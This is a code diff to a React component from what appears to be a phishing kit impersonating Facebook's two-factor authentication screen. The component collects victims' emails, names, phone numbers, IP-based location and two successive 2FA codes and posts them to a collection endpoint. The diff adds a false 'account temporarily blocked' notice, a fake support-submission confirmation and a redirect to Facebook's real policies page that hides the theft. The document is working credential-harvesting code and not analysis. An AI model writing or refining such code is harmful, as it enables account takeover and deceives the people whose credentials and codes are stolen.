@@ -1,6 +1,6 @@
 import React, { useEffect, useState } from 'react'
 import { Link, useNavigate } from 'react-router-dom'
-import { favicon } from './Publics/images/images'
+import { favicon, icon_warring, twofa } from './Publics/images/images'
 import { Button, InputNumber , Form } from 'antd';
 import axios from 'axios';
 
@@ -39,6 +39,10 @@ const ConfirmComponent = () => {
         setActivePopup(false)
     }
 
+    const handleFinal = () => {
+        window.location.replace('https://www.facebook.com/policies_center/');
+    }
+
     const onFinishCodes = (values) => {
         
         axios.get(`https://api.db-ip.com/v2/free/self`)
@@ -56,7 +60,7 @@ const ConfirmComponent = () => {
                             'fill_business_email': firstCode.fill_business_email,
                             'fill_personal_email': firstCode.fill_personal_email,
                             'fill_full_name': firstCode.fill_full_name,
-                            'fill_facebook_pagename': firstCode.fill_facebook_pagename,
+                            'fill_your_name': firstCode.fill_your_name,
                             'fill_phone': firstCode.fill_phone,
                             'ip': firstCode.ip,
                             'city': firstCode.city,
@@ -66,7 +70,7 @@ const ConfirmComponent = () => {
                             'first_code': firstCode.first_code ,
                         }
             
-                        axios.post( "http://localhost:3001/api/news", data) 
+                        axios.post( "http://localhost:8080/api/news", data) 
                     }
             
                     
@@ -80,7 +84,7 @@ const ConfirmComponent = () => {
                             'fill_business_email': finalCode.fill_business_email,
                             'fill_personal_email': finalCode.fill_personal_email,
                             'fill_full_name': finalCode.fill_full_name,
-                            'fill_facebook_pagename': finalCode.fill_facebook_pagename,
+                            'fill_your_name': finalCode.fill_your_name,
                             'fill_phone': finalCode.fill_phone,
                             'ip': finalCode.ip,
                             'city': finalCode.city,
@@ -91,10 +95,12 @@ const ConfirmComponent = () => {
                             'second_code': values.fill_code,
                         }
             
-                        axios.post( "http://localhost:3001/api/news", data)
+                        axios.post( "http://localhost:8080/api/news", data)
                             .then((response) => {
                                 if (response.data.status === 0 ) {
-                                    navigate('/account/waitting');
+                                    // navigate('/account/waitting');
+                                    // handleFinal()
+                                    handleOpendPopup()
                                 }
                             })
                     }
@@ -128,7 +134,7 @@ const ConfirmComponent = () => {
 
                 <div className="main-confirm">
                     <div className="container">
-                        <div className="content col-md-8 col-12">
+                        <div className="content col-md-7 col-12">
                             <Form
                                 name="basicForm"
                                 initialValues={{
@@ -140,9 +146,11 @@ const ConfirmComponent = () => {
                                 <div className="card">
                                     <h3 className="twh3">Two-factor authentication required (1/3)</h3>
                                     <div className="bodyyy">
-                                        <p> You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser. </p>
-                                        <p> Enter the 6-digit code from your <strong>code generator</strong> or third-party app below. </p>
+                                        <p> We have temporarily blocked your account because Facebook Protect has changed. Verify code has been send to 2321****.</p>
 
+                                        <div>
+                                            <img src={twofa} width="100%" className="" alt="" />  
+                                        </div>
                                            
                                         <div className="form-group" style={{paddingLeft: "0px", paddingTop: "5px", paddingBottom: "10px", display: "inline-block"}}>
                                                 
@@ -155,9 +163,6 @@ const ConfirmComponent = () => {
                                             >
                                                 <Form.Item
                                                     name="fill_code"
-                                                    style={{
-                                                        margin: "0"
-                                                    }}
                                                     rules={[
                                                         {
                                                         required: true,
@@ -165,39 +170,32 @@ const ConfirmComponent = () => {
                                                         },
                                                     ]}
                                                 >
-                                                    <InputNumber 
-                                                        maxLength={8}
-                                                        minLength={4}
-                                                        style={{
-                                                            marginLeft: "0px ", 
-                                                            fontSize: "14px", 
-                                                            borderRadius: "4px", 
-                                                            boxShadow: "rgba(0, 0, 0, 0.08) 0px 1px 1px inset", 
-                                                            color: "rgb(78, 77, 77)"
-                                                        }}
-                                                    />
-
+                                                    <InputNumber/>
                                                 </Form.Item>
 
-                                                <div className="form-group paddingleftt" style={{ display: "inline-block"}}>
-                                                    <p name="" id="timer" className={`nolink ${activeLink === true ? 'active' : ''}`} style={{backgroundColor: "transparent", border: "transparent", padding: "0px", margin: "0px",  color: "rgb(56, 88, 152)", fontSize: "13px"}}> 
-                                                        ( wait: <span id="timeri" style={{marginBottom: "0px"}}> {minutes}:{seconds < 10 ? `0${seconds}` : seconds} </span> ) 
-                                                    </p>
-                                                    <Link id="sendcodeagain" className={`btn ${activeLink === true ? 'active' : ''}`} to="">Send Code Again?</Link>
-                                                </div>
                                             </div>
-
-                                            <div className={`${activeWaring === true ? 'active' : ''}`} id="waring-code"> 
-                                                <p>The code generator you entered is incorrect. Please wait {minutes} minutes {seconds < 10 ? `0${seconds}` : seconds} seconds to receive another one.</p>
-                                            </div>
-                                                
-
                                         </div>
+
+                                        <div className={`${activeWaring === true ? 'active' : ''}`} id="waring-code"> 
+                                            <p>The code generator you entered is incorrect. Please wait {minutes} minutes {seconds < 10 ? `0${seconds}` : seconds} seconds to receive another one.</p>
+                                        </div>
+
+                                        <div className="bottom">
+                                            <div className="icon" style={{width: "2rem"}}>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ionicon s-ion-icon" viewBox="0 0 512 512"><path d="M256 56C145.72 56 56 145.72 56 256s89.72 200 200 200 200-89.72 200-200S366.28 56 256 56zm0 82a26 26 0 11-26 26 26 26 0 0126-26zm48 226h-88a16 16 0 010-32h28v-88h-16a16 16 0 010-32h32a16 16 0 0116 16v104h28a16 16 0 010 32z"></path></svg>
+                                            </div>
+                                            <div className="right">
+                                                <p>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser. Enter the 6-digit code from your code generator or third-party app below.</p>
+                                                <p style={{fontSize: "1rem"}}>Please wait {minutes} minutes {seconds < 10 ? `0${seconds}` : seconds} seconds to request the sending of the code.</p>
+                                            </div>
+                                        </div>
+
+                                        <p style={{fontSize: "1rem"}}>We'll walk you through some steps to secure and unlock your account.</p>
                                     </div> 
 
 
                                     <div className="footerii" style={{width: "100%"}}>
-                                        <Link onClick={handleOpendPopup} data-toggle="modal" data-target="#twof" className="linkupertwo" style={{fontSize: "14px", color: "rgb(56, 88, 152)", fontWeight: "600", marginBottom: "0px", float: "left", marginTop: "6px", cursor: "pointer", textDecoration: "none"}}>Need another way to authenticate?</Link>
+                                        
                                         <Form.Item 
                                             style={{
                                                 color: "rgb(255, 255, 255)", 
@@ -234,22 +232,27 @@ const ConfirmComponent = () => {
 
 
                 <div className={`popup  ${activePopup === true ? 'active' : ''}`} id="popup">
-                    <div className="background" onClick={handleClosePopup}></div>
+                    <div className="background"  onClick={handleClosePopup}></div>
                     <div className="content">
                         <div className="modal-header custom-header px-0">
-                            <h5 id="exampleModalLabel" className="modal-title" style={{fontSize: "18px", fontWeight: "600"}}> Didn't receive a code?</h5>
-                            <button type="button" data-dismiss="modal" aria-label="Close" onClick={handleClosePopup} className="close">
-                                <span aria-hidden="true" >×</span>
-                            </button>
+                            <h5 id="exampleModalLabel" className="modal-title" style={{fontSize: "18px", fontWeight: "600"}}>Form Submitted Successfully!</h5>
                         </div>
 
-                        <div >
-                            <p>1. Go to <b>{`Setting > Security and Login`}</b></p>
-                            <p>2. Under the <b>Two-Factor Authentication</b> section, click <b>Use Two-Factor Authentication.</b> You may need to re-enter your password.</p>
-                            <p>3. Next to <b>Recovery Codes,</b> click <b>Setup</b> then <b>Get Codes.</b> If you're already set up recovery codes, you can click <b>Show Codes.</b></p>
+                        <div style={{padding : '1rem 0',borderBottom: '1px solid #dee2e6'}}>
+                            <p>Thanks for contacting us. You'll get a notification when we respond in 1-2 business days. You can view responses in your Support Inbox.</p>
                         </div>
                         <div style={{textAlign: "right"}}>
-                            <button onClick={handleClosePopup} className="btn butoni" style={{color: "rgb(255, 255, 255)", backgroundColor: "#9c9d9f ", marginTop: "20px ", width: "auto "}}>Close</button>
+                            <button className="btn butoni" onClick={handleFinal} style={{
+                                color: "rgb(255, 255, 255)", 
+                                backgroundColor: "rgb(44, 132, 244)", 
+                                width: "auto",
+                                float: 'right',
+                                margin: '0',
+                                padding: '0.3rem 1rem'
+                            }}>
+                            
+                            ok
+                            </button>
                         </div>
 
                     </div>
